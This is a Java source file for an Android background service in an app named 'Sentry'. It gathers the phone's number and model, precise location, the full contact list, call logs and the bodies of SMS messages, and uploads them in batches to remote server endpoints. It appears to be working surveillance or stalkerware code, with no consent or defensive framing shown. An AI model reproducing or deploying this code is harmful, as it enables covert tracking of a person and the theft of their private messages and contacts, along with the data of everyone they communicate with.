package com.ville.sentry;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.baidu.location.BDGeofence;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;
import com.ville.sentry.bean.SCall;
import com.ville.sentry.bean.SContact;
import com.ville.sentry.bean.SLocation;
import com.ville.sentry.bean.SSms;
import com.ville.sentry.bean.WebResult;
import com.ville.sentry.db.DBDao;
import com.ville.sentry.db.DBImpl;

public class WorkService extends Service {
	
	/**
     * Timestamp (milliseconds since epoch) of when this contact was last updated.  This
     * includes updates to all data associated with this contact including raw contacts.  Any
     * modification (including deletes and inserts) of underlying contact data are also
     * reflected in this timestamp.
     */
    public static final String CONTACT_LAST_UPDATED_TIMESTAMP =
            "contact_last_updated_timestamp";
    private final Uri SMS_CONTENT_URI = Uri.parse("content://sms");

	public static final String ACTION_LOCATION_REQ 			= "sentry.action.loc.req";
	public static final String ACTION_LOCATION_UPLOAD 		= "sentry.action.loc.upload";
	public static final String ACTION_CONTACT_UPLOAD 		= "sentry.action.contact.upload";
	public static final String ACTION_CALL_LOG_UPLOAD 		= "sentry.action.call_log.upload";
	public static final String ACTION_SMS_UPLOAD 			= "sentry.action.sms.upload";
	
	public static final String KEY_LOCATION_UPLOAD_TIME 	= "sentry.key.loction.UploadTime";
	
	public static final String KEY_CALL_LAST_UPDATE_TIME 	= "sentry.key.call.lastUpdateTime";
	public static final String KEY_CONTACT_LAST_UPDATE_TIME = "sentry.key.contact.lastUpdateTime";
	public static final String KEY_SMS_LAST_UPDATE_TIME 	= "sentry.key.sms.lastUpdateTime";
	
	public static final String KEY_MOBILE_INFO 	= "sentry.key.mobileInfoUpload";
	
	private LocationClient mClient;
	private MyLocationListener mLocationListener;
	private boolean mMobileInfoUploaded;
	
	private Object mLock = new Object();
	private static final String TAG = "Sentry/WorkService";
	
	public WorkService() {
		// TODO Auto-generated constructor stub
	}
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		AppLog.d(TAG, "[onCreate]: WorkService ");
		mClient = new LocationClient(this.getApplicationContext());
		mLocationListener = new MyLocationListener();
		mClient.registerLocationListener(mLocationListener);
		
		initLocationParams();
	}
	
	private void initLocationParams(){
		//定位模式
		LocationMode mode = LocationMode.Hight_Accuracy;
		//坐标类型
		String coor = BDGeofence.COORD_TYPE_GCJ;
		//扫描的时间间隔
		//int span = 10000;
		
		LocationClientOption option = new LocationClientOption();
		option.setLocationMode(mode);
		option.setCoorType(coor);
		// setScanSpan(1000): 当不设此项，或者所设的整数值小于1000（ms）时，采用一次定位模式。
		// 每调用一次requestLocation( )，定位SDK会发起一次定位。请求定位与监听结果一一对应。
		//option.setScanSpan(span);
		option.setIsNeedAddress(true); //是否解析为实际地址
		mClient.setLocOption(option);
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		AppLog.d(TAG, "[onBind]: WorkService ");
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		if(intent == null){
			return START_STICKY;
		}
		AppLog.d(TAG, "[onStartCommand] " + new Date() + ", " + intent.getAction());
		ensureMobileInfoUpload();
		String action = intent.getAction();
		if(ACTION_LOCATION_REQ.equals(action)){
			if(!mClient.isStarted()){
				mClient.start();
				mClient.requestLocation();
			}else {
				AppLog.d(TAG, "[onStartCommand] ReqLocation is Running, SKIP this request.");
			}
		}else if (ACTION_LOCATION_UPLOAD.equals(action)){
			new UploadLocationTask().execute();
			
		}else if (ACTION_CONTACT_UPLOAD.equals(action)){
			new UploadContactTask().execute();
			
		}else if (ACTION_CALL_LOG_UPLOAD.equals(action)){
			new UploadCallLogTask().execute();
			
		}else if (ACTION_SMS_UPLOAD.equals(action)){
			new UploadSmsTask().execute();
		}
		return super.onStartCommand(intent, flags, startId);
	}
	
	
	private void ensureMobileInfoUpload() {
		// TODO Auto-generated method stub
		if (mMobileInfoUploaded) {
			return;
		}
		new Thread(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				synchronized (mLock) {
					if(mMobileInfoUploaded){
						return;
					}
					String infos = SentryApplication.getApp().getMobileInfos();
					TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
					String uuid = SentryApplication.getApp().getUuid();
					String phoneNumber = tm.getLine1Number();
					String model = android.os.Build.MODEL;
					String sysVer = android.os.Build.VERSION.RELEASE;
					String buildInfos = uuid + "," + phoneNumber + "," + model + "," + sysVer;
					if(infos.equals(buildInfos)){
						mMobileInfoUploaded = true;
					}else {
						boolean success = uploadMobileInfo(uuid, phoneNumber, model, sysVer);
						if(success) {
							SentryApplication.getApp().setMobileInfos(buildInfos);
							mMobileInfoUploaded = true;
						}
						AppLog.d(TAG, "[Mobile] upload success ? " + success);
					}
				}
			}
		}).start();
	}
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		AppLog.d(TAG, "[onDestroy]: WorkService ");
		if(mClient!= null && mClient.isStarted()){
			mClient.stop();
			mClient.unRegisterLocationListener(mLocationListener);
		}
	}
	
	
	/**
	 * 实现实位回调监听
	 */
	private class MyLocationListener implements BDLocationListener {
		
		@Override
		public void onReceiveLocation(BDLocation location) {
			//Receive Location 
			StringBuffer sb = new StringBuffer(256);
			sb.append("Now: " + new Date() + "\n");
			sb.append("时间: " + location.getTime()).append("\n");
			sb.append("ErrorCode : " + location.getLocType()).append("\n");
			sb.append("纬度 : " + location.getLatitude()).append("\n");
			sb.append("精度 : " + location.getLongitude()).append("\n");
			sb.append("精度(m) : " + location.getRadius()).append("\n");
			sb.append("地址: " + location.getAddrStr()).append("\n");
			int locType = location.getLocType();
			String locTypeStr = null;
			if (locType == BDLocation.TypeGpsLocation){
				locTypeStr = "GPS定位";
				sb.append("类型：GPS定位").append("\n");
				sb.append("速度: " + location.getSpeed()).append("\n");
				sb.append("卫星数: " + location.getSatelliteNumber()).append("\n");
			} else if (locType == BDLocation.TypeNetWorkLocation){
				locTypeStr = "网络定位-" + parseOperatorCode(location.getOperators());
				sb.append("类型：网络定位").append("\n");
				sb.append("运营商 : " + parseOperatorCode(location.getOperators())).append("\n");
			} else if (locType == BDLocation.TypeOffLineLocation){
				locTypeStr = "离线定位";
				sb.append("类型：离线定位").append("\n");
			} else {
				sb.append("定位失败").append("\n");
			}
			if(locType == BDLocation.TypeGpsLocation
					|| locType == BDLocation.TypeNetWorkLocation
					|| locType == BDLocation.TypeOffLineLocation){
				SLocation loc = new SLocation();
				loc.time = location.getTime();
				loc.addr = location.getAddrStr();
				loc.city = location.getCity();
				loc.latitude = location.getLatitude();
				loc.longitude = location.getLongitude();
				loc.province = location.getProvince();
				loc.locType = locTypeStr;
				loc.radius = location.getRadius();
				DBDao db = DBImpl.getInstance();
				db.insertLocation(loc);
				AppLog.d(TAG, "insertIntoLocation: t[" + loc.time + "], <" + loc.addr + ">");
				
				if(Utility.isConnected(WorkService.this)){
					SentryApplication.getApp().startUploadLocation(WorkService.this);
				}
			}else {
				AppLog.d(TAG, "request location FAILED!!");
			}
			
			if(mClient != null && mClient.isStarted()){
				AppLog.d(TAG, "Client STOP");
				mClient.stop();
			}
			
		}
	}
	
	private String parseOperatorCode(int code){
		switch (code) {
		case BDLocation.OPERATORS_TYPE_MOBILE:
			return "中国移动";
		case BDLocation.OPERATORS_TYPE_TELECOMU:
			return "中国电信";
		case BDLocation.OPERATORS_TYPE_UNICOM:
			return "中国联通";
		case BDLocation.OPERATORS_TYPE_UNKONW:
		default:
			return "未知/WiFi";
		}
	}
	
	class UploadLocationTask extends AsyncTask<Void, Void, Boolean> {

		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			String lastUploadServer = SentryApplication.getApp().getLocationLastUploadTime();
			String lastestLocal = getLocationLatestUpdateTime();
			ArrayList<SLocation> locations = DBImpl.getInstance().getLocations(lastUploadServer);
//			AppLog.d(TAG, "size is " + locations.size() + ", Since Sever " + serverLatest);
			if(locations != null && locations.size() > 0){
				boolean success = uploadLocationList(locations);
				if(success){
					SentryApplication.getApp().setLocationLastUploadTime(lastestLocal);
				}
				AppLog.d(TAG, "[Location] upload success ? " + success);
			} else {
				AppLog.d(TAG, "No new locations Found!!");
			}
			
			return true;
		}
		
	}
	
	class UploadContactTask extends AsyncTask<Void, Void, Boolean> {

		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			ContentResolver cr = getContentResolver();
			long latestLocal = getContactLastestUpdateTime(cr);
			long lastUpdateServer = SentryApplication.getApp().getContactLastUpdateTime();
			if(lastUpdateServer < latestLocal){
				Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
				AppLog.d(TAG, "[Contact] size = " + cursor.getCount());
				ArrayList<SContact> list = new ArrayList<SContact>();
				while(cursor.moveToNext()){
					SContact contact = new SContact();
					String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
				    String name = cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));
					
				    //查询该位联系人的电话号码，类似的可以查询email，photo
				    String[] proj = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
				    String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?";
				    String seleArgs[] = new String[]{contactId};
				    Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj,
				    		selection, seleArgs, null);
				    //一个人可能有几个号码
				    StringBuilder sb = new StringBuilder();
				    while(phoneCursor.moveToNext()){
				        String strPhoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
				        sb.append(strPhoneNumber + ",");
				    }
				    contact._idStr = Utility.genContactId(name, contactId);
					contact.name = name;
					contact.number = sb.toString();
					list.add(contact);
					AppLog.d(TAG, "[Contact] > " + contact);
					
				    phoneCursor.close();
				}
				cursor.close();
				
				boolean success = false;
				if(Utility.isConnected(WorkService.this)){
					success = uploadContacts(list);
					if(success){
						SentryApplication.getApp().setContactLastUpdateTime(latestLocal);
					}
				}
				AppLog.d(TAG, "[Contact] upload success ? " + success);
			}else {
				AppLog.d(TAG, "[Contact] Can not found updates in contact database, SKIP!!");
			}
			return true;
		}

	}
	
	class UploadCallLogTask extends AsyncTask<Void, Void, Boolean> {
		
		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			ContentResolver cr = getContentResolver();
			long latestLocal = getCallLatestUpdateTime(cr);
			long lastUpdateServer = SentryApplication.getApp().getCallLastUpdateTime();
			if(lastUpdateServer < latestLocal) {
				int deltaDay = (int) Math.ceil((latestLocal - lastUpdateServer) / (24 * 3600000));
				int max = Math.max(1, Math.min(deltaDay, 5)) * 60;
				String where = CallLog.Calls.DATE + ">" + lastUpdateServer;
				Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, where, null, 
						CallLog.Calls.DATE + " DESC LIMIT " + max);
				AppLog.d(TAG, "[Call] size = " + cursor.getCount());
				ArrayList<SCall> list = new ArrayList<SCall>();
				while(cursor.moveToNext()){
					SCall call = new SCall();
					call.number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
					call._date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
					call.duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
					call.name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
					call.type = SCall.parseType(cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
				    AppLog.d(TAG, "[Call] > " + call.toString());
				    list.add(call);
				}
				cursor.close();
				boolean success = false;
				if(Utility.isConnected(WorkService.this)){
					success = uploadCalls(list);
					if(success){
						SentryApplication.getApp().setCallLastUpdateTime(latestLocal);
					}
				}
				AppLog.d(TAG, "[Call] upload success ? " + success);
			}else {
				AppLog.d(TAG, "[Call] Can not found updates in calllog database, SKIP!!");
			}
			
			return true;
		}
		
	}
	
	class UploadSmsTask extends AsyncTask<Void, Void, Boolean> {
		
		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			ContentResolver cr = getContentResolver();
			long lastUpdateServer = SentryApplication.getApp().getSmsLastUpdateTime();
			
			final String where = "date > " + lastUpdateServer;
			Cursor cs = cr.query(SMS_CONTENT_URI, new String[] { "count(*)" },
					where, null, null);
			int newestCount = 0;
			if(cs.moveToFirst()){
				newestCount = cs.getInt(0);
				AppLog.d(TAG, "[Call] $$$$$ Total Count " + newestCount);
			}
			cs.close();
			if(newestCount > 0) {
				// 分页上传，升序排列
				final int pageSize = 50;
				for(int pn = 0; pn * pageSize < newestCount; pn ++){
					Cursor cursor = cr.query(SMS_CONTENT_URI, null, where, null,
							"date ASC LIMIT " + pn * pageSize + ", " + pageSize);
					AppLog.d(TAG, "[Call] size = " + cursor.getCount());
					ArrayList<SSms> list = new ArrayList<SSms>();
					long newestTimeInPage = 0L;
					int uploadPageSize = cursor.getCount();
					while(cursor.moveToNext()){
						SSms sms = new SSms();
						sms._date = cursor.getLong(cursor.getColumnIndex("date"));
						sms.number = cursor.getString(cursor.getColumnIndex("address"));
						sms.body = cursor.getString(cursor.getColumnIndex("body"));
						sms.name = queryNameFromDB(cr, sms.number);
						sms.type = SSms.parseType(cursor.getInt(cursor.getColumnIndex("type")));
					    AppLog.d(TAG, "[SMS] > " + sms.toString());
					    list.add(sms);
					    
					    newestTimeInPage = sms._date;
					}
					cursor.close();
					boolean success = false;
					if(Utility.isConnected(WorkService.this)){
						success = uploadSms(list);
						if(success){
							SentryApplication.getApp().setSmsLastUpdateTime(newestTimeInPage);
						}
					}
					AppLog.d(TAG, "[SMS] upload , pn=" + pn + " :["+ (pn * pageSize) + ", "
							+ (pn * pageSize + uploadPageSize) + "], success ? " + success);
				}
			}else {
				AppLog.d(TAG, "[SMS] Can not found updates in sms database, SKIP!!");
			}
			return true;
		}
		
	}
	
	private boolean uploadMobileInfo(String uuid, String number, String model, String sysVersion){
		HashMap<String, String> map = new HashMap<String, String>();
		map.put("uuid", uuid);
		map.put("number", number);
		map.put("model", model);
		map.put("sysVersion", sysVersion);
		String responce = NetUtil.doPost(Common.URL_UP_MOBILE_INFO, map);
		WebResult result = WebResult.parseByJson(responce);
		return result != null && result.success;
	}
	
	private boolean uploadLocationList(ArrayList<SLocation> locations){
		HashMap<String, String> map = new HashMap<String, String>();
		map.put("locations", SLocation.buildJsonStr(locations));
		map.put("uuid", SentryApplication.getApp().getUuid());
		String responce = NetUtil.doPost(Common.URL_UP_LOCATION, map);
		WebResult result = WebResult.parseByJson(responce);
		return result != null && result.success;
	}
	
	private boolean uploadCalls(ArrayList<SCall> list) {
		// TODO Auto-generated method stub
		HashMap<String, String> map = new HashMap<String, String>();
		map.put("calls", SCall.buildJsonStr(list));
		map.put("uuid", SentryApplication.getApp().getUuid());
		String responce = NetUtil.doPost(Common.URL_UP_CALL, map);
		WebResult result = WebResult.parseByJson(responce);
		return result != null && result.success;
	}
	
	private boolean uploadContacts(ArrayList<SContact> list) {
		// TODO Auto-generated method stub
		HashMap<String, String> map = new HashMap<String, String>();
		map.put("contacts", SContact.buildJsonStr(list));
		map.put("uuid", SentryApplication.getApp().getUuid());
		String responce = NetUtil.doPost(Common.URL_UP_CONTACT, map);
		WebResult result = WebResult.parseByJson(responce);
		return result != null && result.success;
	}
	
	private boolean uploadSms(ArrayList<SSms> list) {
		// TODO Auto-generated method stub
		HashMap<String, String> map = new HashMap<String, String>();
		map.put("smses", SSms.buildJsonStr(list));
		map.put("uuid", SentryApplication.getApp().getUuid());
		String responce = NetUtil.doPost(Common.URL_UP_SMS, map);
		WebResult result = WebResult.parseByJson(responce);
		return result != null && result.success;
	}
	
	private String getLocationLatestUpdateTime(){
		DBDao db = DBImpl.getInstance();
		String latest = db.getLatestTime();
		if(TextUtils.isEmpty(latest)){
			latest = "2015-01-01 01:00:00";
		}
		return latest;
	}
	
	private long getContactLastestUpdateTime(ContentResolver cr){
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI,
				new String[]{CONTACT_LAST_UPDATED_TIMESTAMP},
				null, null,
				CONTACT_LAST_UPDATED_TIMESTAMP + " DESC limit 1" // order by
				);
		long lastUpdate = 0L;
		if(cursor != null && cursor.getCount() > 0 && cursor.moveToNext()){
			lastUpdate = cursor.getLong(cursor.getColumnIndex(CONTACT_LAST_UPDATED_TIMESTAMP));
			cursor.close();
		}
		AppLog.d(TAG, "getContactLastestUpdateTime " + lastUpdate + ", " + new Date(lastUpdate));
		return lastUpdate;
	}
	
	private long getCallLatestUpdateTime(ContentResolver cr){
		Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, 
				new String[] {CallLog.Calls.DATE},
				null, null, 
				CallLog.Calls.DATE + " DESC LIMIT 1");
		long lastUpdate = 0L;
		if(cursor != null && cursor.getCount() > 0 && cursor.moveToNext()){
			lastUpdate = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
			cursor.close();
		}
		AppLog.d(TAG, "getCallLatestUpdateTime " + lastUpdate + ", " + new Date(lastUpdate));
		return lastUpdate;
	}
	
	@SuppressWarnings("unused")
	private long getSmsLatestUpdateTime(ContentResolver cr) {
		// TODO Auto-generated method stub
		final String DATE = "date";
		Cursor cursor = cr.query(SMS_CONTENT_URI, 
				new String[] { DATE },
				null, null, 
				DATE + " DESC LIMIT 1");
		long latest = 0L;
		if(cursor != null && cursor.getCount() > 0 && cursor.moveToNext()){
			latest = cursor.getLong(cursor.getColumnIndex(DATE));
			cursor.close();
		}
		AppLog.d(TAG, "getSmsLastestUpdateTime " + latest + ", " + new Date(latest));
		
		return latest;
	}
	
	private String queryNameFromDB(ContentResolver cr, String number){
		if(TextUtils.isEmpty(number)){
			return "";
		}
		Uri contactUri = Uri.withAppendedPath(
				ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
		StringBuilder sb = new StringBuilder();
		String[] projection = {ContactsContract.PhoneLookup.DISPLAY_NAME};
		Cursor cs = cr.query(contactUri, projection, null, null, null);
		while(cs.moveToNext()) {
			String name_one = cs.getString(cs.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
			sb.append(name_one);
			if(!cs.isLast()){
				sb.append(",");
			}
		}
		cs.close();
		//AppLog.d(TAG, "[queryNameFromDB] number is " + number + "> " + sb.toString());
		return sb.toString();
	}
	
	
	
	/*
	 * 获取error code：
	public int getLocType ( )
	返回值：
	
	61 ： GPS定位结果
	62 ： 扫描整合定位依据失败。此时定位结果无效。
	63 ： 网络异常，没有成功向服务器发起请求。此时定位结果无效。
	65 ： 定位缓存的结果。
	66 ： 离线定位结果。通过requestOfflineLocaiton调用时对应的返回结果
	67 ： 离线定位失败。通过requestOfflineLocaiton调用时对应的返回结果
	68 ： 网络连接失败时，查找本地离线定位时对应的返回结果
	161： 表示网络定位结果
	162~167： 服务端定位失败
	
	
	Hight_Accuracy
	高精度定位模式下，会同时使用GPS、Wifi和基站定位，返回的是当前条件下精度最好的定位结果</string>
    Battery_Saving
    低功耗定位模式下，仅使用网络定位即Wifi和基站定位，返回的是当前条件下精度最好的网络定位结果</string>
   	Device_Sensors
    仅用设备定位模式下，只使用用户的GPS进行定位。这个模式下，由于GPS芯片锁定需要时间，首次定位速度会需要一定的时间</string>
	 
	 * */
	
}
